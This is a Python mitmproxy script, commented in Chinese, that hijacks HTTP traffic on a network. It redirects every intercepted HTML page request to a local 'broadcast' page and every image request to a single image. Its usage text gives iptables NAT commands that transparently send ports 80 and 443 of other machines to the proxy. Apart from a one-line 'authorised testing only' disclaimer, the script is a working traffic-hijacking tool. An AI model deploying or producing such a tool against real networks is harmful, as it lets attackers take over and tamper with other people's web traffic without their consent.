#!/usr/bin/env python3
"""
HTTP劫持脚本 - 使用mitmproxy劫持所有HTTP请求
⚠️ 仅用于授权测试环境！
"""
from mitmproxy import http
import sys
import logging

logging.basicConfig(level=logging.INFO, format='[%(levelname)s] %(message)s')
logger = logging.getLogger(__name__)

# 广播页面URL
BROADCAST_URL = "http://192.168.1.100:5000/broadcast-player"
ONEIMAGE_URL = "http://192.168.1.100:5000/static/oneimage.jpg"

# 配置
SIMULATION_MODE = '--simulation' in sys.argv
hijacked_count = 0


def request(flow: http.HTTPFlow) -> None:
    """拦截所有HTTP请求并重定向到广播页面"""
    global hijacked_count

    try:
        url = flow.request.pretty_url
        host = flow.request.pretty_host

        # 跳过对广播服务器本身的请求
        if '192.168.1.100' in host:
            return

        if SIMULATION_MODE:
            logger.info(f"🎭 [模拟] HTTP劫持: {url} -> {BROADCAST_URL}")
            hijacked_count += 1
            return

        # 劫持HTML页面请求
        if 'text/html' in flow.request.headers.get('Accept', ''):
            flow.response = http.Response.make(
                302,
                b"",
                {"Location": BROADCAST_URL}
            )
            hijacked_count += 1
            logger.info(f"🌐 HTTP劫持: {url} -> {BROADCAST_URL}")

        # 劫持图片请求（一图流）
        elif any(ext in url.lower() for ext in ['.jpg', '.jpeg', '.png', '.gif', '.webp']):
            flow.response = http.Response.make(
                302,
                b"",
                {"Location": ONEIMAGE_URL}
            )
            hijacked_count += 1
            logger.info(f"🖼️ 图片劫持: {url} -> {ONEIMAGE_URL}")

    except Exception as e:
        logger.error(f"HTTP劫持失败: {e}")


def done():
    """代理关闭时调用"""
    logger.info(f"\n🛑 HTTP劫持已停止 (共劫持 {hijacked_count} 个请求)")


if __name__ == '__main__':
    logger.warning("=" * 60)
    logger.warning("⚠️  HTTP劫持脚本 (mitmproxy)")
    logger.warning(f"目标: {BROADCAST_URL}")
    logger.warning(f"模拟模式: {'是' if SIMULATION_MODE else '否'}")
    logger.warning("=" * 60)
    logger.info("""
使用方法:
1. 安装 mitmproxy:
   pip install mitmproxy

2. 模拟模式:
   mitmdump -s hijack_http.py -- --simulation

3. 正式模式:
   mitmdump -s hijack_http.py --mode transparent

4. 配置iptables重定向（需要root）:
   sudo iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080
   sudo iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 8080

5. 清理iptables规则:
   sudo iptables -t nat -F
    """)
